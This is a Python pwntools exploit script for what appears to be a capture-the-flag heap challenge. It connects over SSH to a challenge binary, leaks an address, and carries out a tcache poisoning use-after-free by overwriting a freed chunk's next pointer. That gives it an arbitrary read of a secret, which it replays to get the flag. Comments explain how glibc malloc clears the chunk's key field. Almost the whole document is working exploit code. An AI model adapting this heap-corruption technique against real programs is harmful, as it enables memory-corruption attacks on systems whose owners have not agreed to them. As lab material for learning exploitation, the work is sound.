#!/usr/bin/env python

from pwn import *

get_flag = True
chall_name = '7.0'

context.arch = "amd64"

def run_with_gdb(p):
    gdb.attach(p,'''
    b *main
    b *main+1628''')
    run_exploit(p, False)

def run_commands_list(commands, p, print_command):
    for command in commands:
        if print_command:
            print('COMMAND: ', command)
            input("")
        print_send_print(command, p)

def print_send_print(line_to_send, p):
    try:
        p.sendline(line_to_send)
        if get_flag:
            print(p.recvrepeat(1).decode())
        else:
            print(p.recvrepeat(0.2).decode())
    except:
        print('Exception in \'print_send_print\'')
        pass

def get_address(output):
    address_start = output.find('0x')
    address_ends = output.find('.', address_start)
    address = output[address_start:address_ends]
    print('Address found: ', address)
    return int(address, 16)

def get_secret_from_output(output):
    print(output)
    start_search_string = 'Data: '
    secret_start = output.find(start_search_string) + len(start_search_string)
    secret_ends = output.find('\n', secret_start)
    return output[secret_start:secret_ends]

def run_exploit(p, debug):
    if debug:
        run_with_gdb(p)

    welcome_message = p.recvrepeat(1).decode()
    print(welcome_message)
    secret_leaked_address = get_address(welcome_message) # getting the secret address
    print(hex(secret_leaked_address))
    secret_address = p64(secret_leaked_address)
    
    # the secret its represented by a 16 byte string, when we use a 'use after free' (with the scanf line) and get a arbitraty read of
    # the secret_address (with the malloc who got the corrupted chunk from tcache), we corrupt the secret value because putting
    # the secret_address as a address for a heap chunk will put the secret string value as a "NEXT" and "KEY" value of this chunk
    # (remember, tcache will think that this address represents a valid heap chunk with all his metadata) and when we malloc
    # this corrupted chunk, malloc will nullout the "KEY" (https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#2952).
    # The effect of this are that after we malloc and read the secret, the value will not be abcdabcdXXXXXXXX. Instead, will
    # be abcdabcd\x00\x00\x00\x00\x00\x00\x00\x00. So, we're corrupting the password and had to send the null bytes for
    # the "send_flag" command because the memcpy behind the scenes will be expecting to compare 16 bytes.

    commands = [
                # creating and freeing chunks to feed tcache, we need two because we're going to corrupt the "NEXT" key
                b'malloc 0 100',
                b'malloc 1 100',
                b'free 1',
                b'free 0',
                b'scanf 0 ' + secret_address + b'ZZZZZZZZ' + b'BBBBBBBB', # corrupting the chunk with the address of "secret" as next chunk
                # making two allocations: the first will get one useless chunk, the second will get the chunk poiting to secret
                b'malloc 0 100', 
                b'malloc 0 100'
                ]

    run_commands_list(commands, p, False)
    p.sendline(b'puts 0') # printing the secret
    leaked_secret_output = p.recvrepeat(1).decode()
    secret = get_secret_from_output(leaked_secret_output)

    p.sendline('send_flag')
    p.sendline(secret + '\x00\x00\x00\x00\x00\x00\x00\x00') # inserting the nulls with the secret to make memcpy happy
    print(p.recvrepeat(1).decode())
    p.sendline('quit')

    p.close()

if get_flag:
    ssh_connection = ssh(host='college',user='hacker')
    process_full_path = '/challenge/' + chall_name
    p = ssh_connection.run(process_full_path)
    run_exploit(p, False)
    ssh_connection.close()
else:
    p = process('./' + chall_name)
    run_exploit(p, False)
